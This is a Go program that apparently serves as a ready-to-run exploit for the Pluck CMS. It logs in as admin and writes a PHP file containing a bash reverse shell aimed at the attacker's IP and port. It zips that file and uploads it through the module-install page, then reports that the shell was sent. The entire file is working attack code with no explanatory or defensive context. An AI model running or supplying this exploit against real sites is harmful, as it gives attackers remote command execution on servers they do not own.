package main

import (
    "bytes"
    "flag"
    "fmt"
    "io"
    "mime/multipart"
    "net/http"
    "net/http/cookiejar"
    "net/textproto"
    "net/url"
    "os"
    "os/exec"
    "strings"
)

func main() {
    baseUrl := flag.String("url", "", "pluck base url")
    password := flag.String("password", "", "pluck password")
    localIp := flag.String("i", "", "your listener ip for the reverse shell")
    localPort := flag.Int("p", 0, "your listener port for the reverse shell")
    flag.Parse()

    if *baseUrl == "" || *password == "" || *localIp == "" || *localPort == 0 {
        flag.Usage()
        return
    }

    body := &bytes.Buffer{}
    body.Write([]byte(fmt.Sprintf("cont1=%s&bogus=&submit=Log+in", *password)));

    loginRequest, err := http.NewRequest("POST", *baseUrl + "/login.php", body)
    if err != nil {
        panic(err)

    }
    loginRequest.Header.Add("Content-Type", "application/x-www-form-urlencoded")
    jar, _ := cookiejar.New(nil)
    proxyUrl, _ := url.Parse("http://localhost:8080")
    transport := &http.Transport{ Proxy: http.ProxyURL(proxyUrl) }
    client := http.Client{
        Jar: jar,
        Transport: transport,
    }

    loginResponse, err := client.Do(loginRequest)
    if err != nil {
        panic(err)
    }

    if loginResponse.StatusCode != 200 {
        panic("Login failed")
    }

    err = os.WriteFile("exploit.php", []byte(fmt.Sprintf(`<?php exec("/bin/bash -c 'bash -i >/dev/tcp/%s/%d 0>&1 &'"); ?>`, *localIp, *localPort)), 0644)
    if err != nil {
        panic(err)
    }

    _, err = exec.Command("zip", "exploit.zip", "exploit.php").Output()
    if err != nil {
        panic(err)
    }

    file, err := os.Open("exploit.zip")
    if err != nil {
        panic(err)
    }
    defer file.Close()

    body = &bytes.Buffer{}
    writer := multipart.NewWriter(body)


    filefield, err := writer.CreatePart(
        textproto.MIMEHeader{
            "Content-Disposition": []string{`form-data; name="sendfile"; filename="exploit.zip"`},
            "Content-Type":        []string{"application/zip"},
        })
    if err != nil {
        panic(err)
    }

    _, err = io.Copy(filefield, file)
    if err != nil {
        panic(err)
    }

    err = writer.WriteField("submit", "Update")
    if err != nil {
        panic(err)
    }

    err = writer.Close() 
    if err != nil {
        panic(err)
    }

    r, err := http.NewRequest(http.MethodPost, *baseUrl + "/admin.php?action=installmodule", body)
    if err != nil {
        panic(err)
    }
    r.Header.Set("Host", strings.TrimPrefix(*baseUrl, "http://"))
    r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0")
    r.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    r.Header.Set("Accept-Language", "en-US,en;q=0.5")
    r.Header.Set("Content-Type", "multipart/form-data; boundary=" + writer.Boundary())
    r.Header.Set("Origin", *baseUrl)
    r.Header.Set("Connection", "keep-alive")
    r.Header.Set("Referer", *baseUrl + "/admin.php?action=installmodule")

    resp, err := client.Do(r)
    if err != nil {
        panic(err)
    }

    if resp.StatusCode != 200 {
        panic("payload upload failed")
    }

    fmt.Printf("Reverse shell sent to %s:%d\n", *localIp, *localPort)
}
